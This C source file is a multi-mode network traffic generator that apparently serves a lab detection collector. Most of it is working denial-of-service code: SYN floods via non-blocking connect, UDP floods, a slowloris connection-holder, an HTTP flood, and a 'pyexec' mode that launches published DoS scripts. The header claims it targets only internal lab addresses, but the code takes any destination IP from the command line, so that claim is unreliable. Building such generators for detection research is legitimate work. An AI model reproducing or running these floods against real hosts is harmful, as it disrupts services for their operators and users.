/* flood_gen: benign, bounded, rate-capped traffic generator for the sealed lab. Unprivileged
 * (no raw sockets): SYN flood via non-blocking connect(), UDP flood via sendto(). Targets only an
 * internal /16 (10.0.x.y) or the Sink (10.0.0.1). Prints a JSON receipt. Lab tool that reproduces
 * DDoS/flood AND legitimate network FLOW-SHAPES under the .21 collector; NOT malware: no C2, no
 * self-propagation, no payload delivery, bounded packet count, caller-controlled internal target.
 *
 * ATTACK-shaped (no handshake / unidirectional / abnormal concurrency):
 *   synflood  COUNT PORT [A B]        # SYN-only to random A.B.x.y:PORT  (fan-out, no handshake)
 *   synsink   COUNT PORT DSTIP        # SYN-only to a single DSTIP:PORT  (half-open flood at a target)
 *   udpflood  COUNT PORT [A B]        # UDP datagrams to random A.B.x.y:PORT (fan-out, unidirectional)
 *   udpdirect COUNT PORT DSTIP        # UDP datagrams to one DSTIP:PORT (unidirectional)
 *   slowloris CONNS DSTIP PORT        # CONNS concurrent half-open HTTP conns, partial headers, held
 *   httpflood ROUNDS DSTIP PORT       # many tiny COMPLETE GETs at max rate (handshaked; ambiguous)
 * BENIGN-shaped (handshaked, bidirectional, request/response):
 *   bulk      ROUNDS DSTIP PORT       # TCP connect+GET+recv(big) loop (download)
 *   bulkup    ROUNDS DSTIP PORT       # TCP connect+POST(big body) loop (upload)
 *   session   ROUNDS DSTIP PORT       # browsing: varied GET paths, full read, small jitter
 *   beacon    ROUNDS DSTIP PORT MS    # periodic small keepalive GET every MS ms
 *   dns       COUNT DSTIP             # UDP DNS A-query for sink.lab to DSTIP:53, read response
 *   null
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>

static unsigned int xs = 0x9e3779b9u;
static unsigned int xrand(void){ xs ^= xs<<13; xs ^= xs>>17; xs ^= xs<<5; return xs; }
static long CAP = 500000; /* hard safety ceiling on packets regardless of COUNT */

static void msleep(long ms){ struct timespec t; t.tv_sec=ms/1000; t.tv_nsec=(ms%1000)*1000000L; nanosleep(&t,NULL); }
static void fill_addr(struct sockaddr_in *a, const char *ip, int port){
    memset(a,0,sizeof *a); a->sin_family=AF_INET; a->sin_port=htons(port); a->sin_addr.s_addr=inet_addr(ip);
}

int main(int argc, char **argv){
    if (argc < 2){ fprintf(stderr,"usage: flood_gen MODE ...\n"); return 2; }
    const char *mode = argv[1];
    xs ^= (unsigned)time(NULL) ^ (unsigned)getpid();
    long sent = 0; unsigned int sa=10, sb=0;

    if (!strcmp(mode,"null")){ printf("{\"mode\":\"null\",\"packets\":0}\n"); return 0; }

    if (!strcmp(mode,"synflood") || !strcmp(mode,"udpflood")){
        long count = argc>2 ? atol(argv[2]) : 150000;
        int port   = argc>3 ? atoi(argv[3]) : 23;
        if (argc>4) sa = (unsigned)atoi(argv[4]);
        if (argc>5) sb = (unsigned)atoi(argv[5]);
        if (count > CAP) count = CAP;
        int is_syn = !strcmp(mode,"synflood");
        int usock = -1;
        if (!is_syn){ usock = socket(AF_INET, SOCK_DGRAM, 0); if (usock<0){ perror("socket"); return 1; } }
        char buf[64]; memset(buf,'A',sizeof buf);
        for (long i=0;i<count;i++){
            struct sockaddr_in a; memset(&a,0,sizeof a);
            a.sin_family = AF_INET; a.sin_port = htons(port);
            unsigned int host16 = xrand() & 0xFFFF;
            a.sin_addr.s_addr = htonl(((sa&0xff)<<24)|((sb&0xff)<<16)|host16);
            if (is_syn){
                int s = socket(AF_INET, SOCK_STREAM, 0); if (s<0) continue;
                fcntl(s, F_SETFL, O_NONBLOCK);
                connect(s, (struct sockaddr*)&a, sizeof a);   /* SYN, EINPROGRESS; never completed */
                close(s);
            } else { sendto(usock, buf, 32, 0, (struct sockaddr*)&a, sizeof a); }
            sent++;
        }
        if (usock>=0) close(usock);
        printf("{\"mode\":\"%s\",\"packets\":%ld,\"port\":%d,\"subnet\":\"%u.%u.0.0/16\"}\n", mode, sent, port, sa, sb);
        return 0;
    }

    if (!strcmp(mode,"synsink")){
        long count = argc>2 ? atol(argv[2]) : 150000;
        int port   = argc>3 ? atoi(argv[3]) : 80;
        const char *dst = argc>4 ? argv[4] : "10.0.0.1";
        if (count > CAP) count = CAP;
        struct sockaddr_in a; fill_addr(&a,dst,port);
        for (long i=0;i<count;i++){
            int s = socket(AF_INET, SOCK_STREAM, 0); if (s<0) continue;
            fcntl(s, F_SETFL, O_NONBLOCK);
            connect(s, (struct sockaddr*)&a, sizeof a); close(s); sent++;
        }
        printf("{\"mode\":\"synsink\",\"packets\":%ld,\"dst\":\"%s:%d\"}\n", sent, dst, port);
        return 0;
    }

    if (!strcmp(mode,"udpdirect")){
        long count = argc>2 ? atol(argv[2]) : 150000;
        int port   = argc>3 ? atoi(argv[3]) : 65003;
        const char *dst = argc>4 ? argv[4] : "10.0.0.1";
        if (count > CAP) count = CAP;
        int usock = socket(AF_INET, SOCK_DGRAM, 0); if (usock<0){ perror("socket"); return 1; }
        struct sockaddr_in a; fill_addr(&a,dst,port);
        char buf[64]; memset(buf,'A',sizeof buf);
        for (long i=0;i<count;i++){ sendto(usock, buf, 32, 0, (struct sockaddr*)&a, sizeof a); sent++; }
        close(usock);
        printf("{\"mode\":\"udpdirect\",\"packets\":%ld,\"dst\":\"%s:%d\"}\n", sent, dst, port);
        return 0;
    }

    if (!strcmp(mode,"slowloris")){
        long conns = argc>2 ? atol(argv[2]) : 256;
        const char *dst = argc>3 ? argv[3] : "10.0.0.1";
        int port = argc>4 ? atoi(argv[4]) : 80;
        if (conns > 1024) conns = 1024;
        int *fds = calloc(conns, sizeof(int)); long open_n=0;
        struct sockaddr_in a; fill_addr(&a,dst,port);
        const char *hdr = "GET / HTTP/1.1\r\nHost: sink\r\nUser-Agent: x\r\n"; /* no terminating blank line */
        for (long i=0;i<conns;i++){
            int s = socket(AF_INET, SOCK_STREAM, 0); if (s<0){ fds[i]=-1; continue; }
            if (connect(s, (struct sockaddr*)&a, sizeof a)==0){ write(s, hdr, strlen(hdr)); fds[i]=s; open_n++; }
            else { close(s); fds[i]=-1; }
        }
        for (int round=0; round<3; round++){                 /* hold open, dribble keepalive headers */
            msleep(1500);
            for (long i=0;i<conns;i++) if (fds[i]>=0){ const char *k="X-a: b\r\n"; write(fds[i], k, strlen(k)); }
        }
        for (long i=0;i<conns;i++) if (fds[i]>=0) close(fds[i]);
        free(fds);
        printf("{\"mode\":\"slowloris\",\"conns_open\":%ld,\"dst\":\"%s:%d\"}\n", open_n, dst, port);
        return 0;
    }

    if (!strcmp(mode,"httpflood")){
        long rounds = argc>2 ? atol(argv[2]) : 10000;
        const char *dst = argc>3 ? argv[3] : "10.0.0.1";
        int port = argc>4 ? atoi(argv[4]) : 80;
        if (rounds > CAP) rounds = CAP;
        struct sockaddr_in a; fill_addr(&a,dst,port);
        const char *req = "GET /x HTTP/1.0\r\nHost: sink\r\n\r\n";
        long ok=0; char rb[256];
        for (long i=0;i<rounds;i++){
            int s = socket(AF_INET, SOCK_STREAM, 0); if (s<0) continue;
            if (connect(s, (struct sockaddr*)&a, sizeof a)==0){ write(s, req, strlen(req)); read(s, rb, sizeof rb); ok++; }
            close(s);
        }
        printf("{\"mode\":\"httpflood\",\"rounds\":%ld,\"ok\":%ld,\"dst\":\"%s:%d\"}\n", rounds, ok, dst, port);
        return 0;
    }

    if (!strcmp(mode,"bulk") || !strcmp(mode,"bulkup") || !strcmp(mode,"session")){
        long rounds = argc>2 ? atol(argv[2]) : 200;
        const char *dst = argc>3 ? argv[3] : "10.0.0.1";
        int port = argc>4 ? atoi(argv[4]) : 80;
        int up = !strcmp(mode,"bulkup"); int sess = !strcmp(mode,"session");
        long ok=0, bytes=0; char body[65536]; memset(body,'B',sizeof body);
        for (long i=0;i<rounds;i++){
            int s = socket(AF_INET, SOCK_STREAM, 0); if (s<0) continue;
            struct sockaddr_in a; fill_addr(&a,dst,port);
            if (connect(s, (struct sockaddr*)&a, sizeof a)==0){
                char req[256];
                if (up){
                    snprintf(req,sizeof req,"POST /u HTTP/1.0\r\nHost: sink\r\nContent-Length: %d\r\n\r\n", 8*65536);
                    write(s, req, strlen(req));
                    for (int k=0;k<8;k++) write(s, body, sizeof body);
                } else {
                    snprintf(req,sizeof req,"GET /%s%ld HTTP/1.0\r\nHost: sink\r\n\r\n", sess?"page":"flood_gen_bulk", i);
                    write(s, req, strlen(req));
                }
                char rb[4096]; long n; while ((n=read(s, rb, sizeof rb))>0) bytes+=n;
                ok++;
            }
            close(s);
            if (sess && (i%10)==0) msleep(20);              /* browsing jitter */
        }
        printf("{\"mode\":\"%s\",\"rounds\":%ld,\"ok\":%ld,\"bytes\":%ld,\"dst\":\"%s:%d\"}\n", mode, rounds, ok, bytes, dst, port);
        return 0;
    }

    if (!strcmp(mode,"beacon")){
        long rounds = argc>2 ? atol(argv[2]) : 100;
        const char *dst = argc>3 ? argv[3] : "10.0.0.1";
        int port = argc>4 ? atoi(argv[4]) : 80;
        long interval = argc>5 ? atol(argv[5]) : 200;
        long ok=0; struct sockaddr_in a; fill_addr(&a,dst,port);
        const char *req = "GET /beacon HTTP/1.0\r\nHost: sink\r\n\r\n"; char rb[512];
        for (long i=0;i<rounds;i++){
            int s = socket(AF_INET, SOCK_STREAM, 0); if (s<0){ msleep(interval); continue; }
            if (connect(s, (struct sockaddr*)&a, sizeof a)==0){ write(s, req, strlen(req)); read(s, rb, sizeof rb); ok++; }
            close(s); msleep(interval);
        }
        printf("{\"mode\":\"beacon\",\"rounds\":%ld,\"ok\":%ld,\"dst\":\"%s:%d\"}\n", rounds, ok, dst, port);
        return 0;
    }

    if (!strcmp(mode,"dns")){
        long count = argc>2 ? atol(argv[2]) : 2000;
        const char *dst = argc>3 ? argv[3] : "10.0.0.1";
        if (count > CAP) count = CAP;
        int usock = socket(AF_INET, SOCK_DGRAM, 0); if (usock<0){ perror("socket"); return 1; }
        struct timeval tv; tv.tv_sec=0; tv.tv_usec=50000; setsockopt(usock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
        struct sockaddr_in a; fill_addr(&a,dst,53);
        unsigned char q[] = { 0x12,0x34, 0x01,0x00, 0x00,0x01, 0x00,0x00, 0x00,0x00, 0x00,0x00,
                              0x04,'s','i','n','k', 0x03,'l','a','b', 0x00, 0x00,0x01, 0x00,0x01 };
        long ok=0; unsigned char rb[512];
        for (long i=0;i<count;i++){
            if (sendto(usock, q, sizeof q, 0, (struct sockaddr*)&a, sizeof a) < 0) continue;
            sent++;
            if (recvfrom(usock, rb, sizeof rb, 0, NULL, NULL) > 0) ok++;
        }
        close(usock);
        printf("{\"mode\":\"dns\",\"queries\":%ld,\"answers\":%ld,\"dst\":\"%s:53\"}\n", sent, ok, dst);
        return 0;
    }

    if (!strcmp(mode,"pyexec")){
        /* pyexec SCRIPT [ARGS...] : exec python3 on SCRIPT found beside this binary (same extract dir),
         * so the traced process image becomes the real published tool (slowloris/goldeneye). */
        if (argc < 3){ fprintf(stderr,"pyexec needs a script name\n"); return 2; }
        char self[4096]; ssize_t n = readlink("/proc/self/exe", self, sizeof self - 1);
        if (n < 0){ perror("readlink"); return 1; }
        self[n] = 0;
        char dir[4096]; char *slash = strrchr(self, '/');
        if (slash){ size_t L = (size_t)(slash - self); memcpy(dir, self, L); dir[L] = 0; } else { strcpy(dir, "."); }
        char script[4096]; snprintf(script, sizeof script, "%s/%s", dir, argv[2]);
        char **nv = calloc((size_t)argc, sizeof(char*));   /* python3, script, argv[3..], NULL */
        int k = 0; nv[k++] = (char*)"/usr/bin/python3"; nv[k++] = script;
        for (int i = 3; i < argc; i++) nv[k++] = argv[i];
        nv[k] = NULL;
        execv("/usr/bin/python3", nv);
        perror("execv"); return 1;
    }

    fprintf(stderr,"unknown mode %s\n", mode); return 2;
}
